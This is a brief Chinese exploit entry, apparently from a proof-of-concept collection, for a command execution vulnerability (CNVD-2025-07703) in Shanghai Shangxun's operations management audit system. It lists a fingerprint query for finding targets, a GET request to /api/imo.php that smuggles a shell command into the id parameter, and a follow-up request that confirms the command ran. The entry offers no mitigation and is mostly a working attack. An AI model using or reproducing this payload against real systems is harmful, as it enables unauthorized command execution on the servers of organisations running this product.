# 上海上讯信息技术股份有限公司运维管理审计系统imo.php存在命令执行漏洞(CNVD-2025-07703)

上海上讯信息技术股份有限公司运维管理审计系统 ｜ 命令执行 ｜ —
- **指纹**：`body="/default/switchlocale"`
- **请求**：`GET /api/imo.php?type=immediate&id=id>rce.txt HTTP/1.1`

**Payload**
```
验证url
GET /api/rce.txt HTTP/1.1
Host:
```
- **响应特征**：200